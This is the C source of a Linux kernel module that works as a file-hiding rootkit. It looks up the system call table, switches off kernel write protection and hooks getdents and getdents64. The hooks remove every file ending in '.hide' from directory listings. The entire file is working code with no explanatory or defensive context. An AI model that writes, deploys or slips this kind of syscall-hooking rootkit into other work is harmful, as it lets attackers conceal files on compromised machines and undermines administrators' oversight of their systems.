#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <asm/paravirt.h>

MODULE_LICENSE("GPL");

// Definitions

#define HIDE_EXT ".hide"
#define EXT_LEN (sizeof(HIDE_EXT) - 1)

// The size of the first 3 linux_dirent fields.
// It should be equal to the size of the first 3 linux_dirent64 fields on x86_64.
#define DIRENT_PART_SIZE (2 * sizeof(unsigned long) + sizeof(unsigned short))

struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char        d_name[1];
};

struct linux_dirent64 {
    u64     d_ino;
    s64     d_off;
    unsigned short  d_reclen;
    unsigned char   d_type;
    char        d_name[0];
};

typedef enum {
    X32,
    X64
} bitness_enum;

typedef asmlinkage long (*sys_getdents_t)(const struct pt_regs *regs);

// Definitions end


// Global variables

unsigned long *sys_call_table = NULL;
sys_getdents_t original_getdents, original_getdents64;

// Global variables end


inline void custom_write_cr0(unsigned long cr0) {
    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

inline void disable_write_protect(void) {
    custom_write_cr0(read_cr0() & (~ 0x10000));
}

inline void enable_write_protect(void) {
    custom_write_cr0(read_cr0() | 0x10000);
}

long filter_dirp(const struct pt_regs *regs, sys_getdents_t getdents_func, bitness_enum bitness) {
    // dirp, filtered_dirp, last_filtered and temp_dirp could point to a linux_dirent (bitness = X32)
    // or linux_dirent64 (bitness = X64) struct. Because of the first 3 fields of linux_dirent and
    // linux_dirent64have the same size and use we just use linux_dirent in all cases.
    // We use name_offset to get d_name value properly.
    struct linux_dirent *dirp, *filtered_dirp, *last_filtered, *temp_dirp;
    size_t name_len, name_offset;
    unsigned long copy_res;
    long orig_bytes_read, res_bytes_read, remaining_bytes;
    char *d_name;

    orig_bytes_read = getdents_func(regs);
    if (orig_bytes_read <= 0) {
        return orig_bytes_read;
    }

    if (bitness == X64) {
        name_offset = sizeof(unsigned char); // size of d_type field
    } else {
        name_offset = 0;
    }

    dirp = (struct linux_dirent *) regs->si;
    filtered_dirp = (struct linux_dirent *) kmalloc(orig_bytes_read, GFP_KERNEL);
    copy_res = copy_from_user(filtered_dirp, dirp, orig_bytes_read);
    if (copy_res != 0) {
        printk(KERN_ALERT "Can't copy from user space");
        kfree(filtered_dirp);
        return orig_bytes_read;
    }

    last_filtered = filtered_dirp;           // Points to the last element of filtered part
    temp_dirp = filtered_dirp;               // Used as iterator to go through all dirp elements
    remaining_bytes = orig_bytes_read;
    res_bytes_read = orig_bytes_read;
    while (remaining_bytes > 0) {
        if (temp_dirp->d_reclen <= 0) {
            printk(KERN_ALERT "linux_dirent/linux_dirent64 struct bad size: %hu", temp_dirp->d_reclen);
            break;
        }

        // Get d_name depending on the bitness
        // See linux_dirent and linux_dirent64 definitions
        d_name = &temp_dirp->d_name[name_offset];
        name_len = strnlen(d_name, temp_dirp->d_reclen - DIRENT_PART_SIZE);

        if (strcmp(HIDE_EXT, d_name + name_len - EXT_LEN) == 0) {
            res_bytes_read -= temp_dirp->d_reclen;
        } else {
            if (last_filtered != temp_dirp) {
                memcpy(last_filtered, temp_dirp, temp_dirp->d_reclen);
            }
            last_filtered = (struct linux_dirent *) ((char *) last_filtered + last_filtered->d_reclen);
        }
        remaining_bytes -= temp_dirp->d_reclen;
        temp_dirp = (struct linux_dirent *) ((char *) temp_dirp + temp_dirp->d_reclen);
    }

    copy_res = copy_to_user(dirp, filtered_dirp, res_bytes_read);
    if (copy_res != 0) {
        printk(KERN_ALERT "Can't copy to user space");
        res_bytes_read = orig_bytes_read;
    }

    kfree(filtered_dirp);
    return res_bytes_read;

}

asmlinkage long getdents_hook(const struct pt_regs *regs) {
    return filter_dirp(regs, original_getdents, X32);
}

asmlinkage long getdents64_hook(const struct pt_regs *regs) {
    return filter_dirp(regs, original_getdents64, X64);
}

static int __init hide_files_init(void) {
    sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
    original_getdents = (void *) sys_call_table[__NR_getdents];
    original_getdents64 = (void *) sys_call_table[__NR_getdents64];
    disable_write_protect();
    sys_call_table[__NR_getdents] = (unsigned long) getdents_hook;
    sys_call_table[__NR_getdents64] = (unsigned long) getdents64_hook;
    enable_write_protect();
    return 0;
}

static void __exit hide_files_exit(void) {
    disable_write_protect();
    sys_call_table[__NR_getdents] = (unsigned long) original_getdents;
    sys_call_table[__NR_getdents64] = (unsigned long) original_getdents64;
    enable_write_protect();
}

module_init(hide_files_init);
module_exit(hide_files_exit);
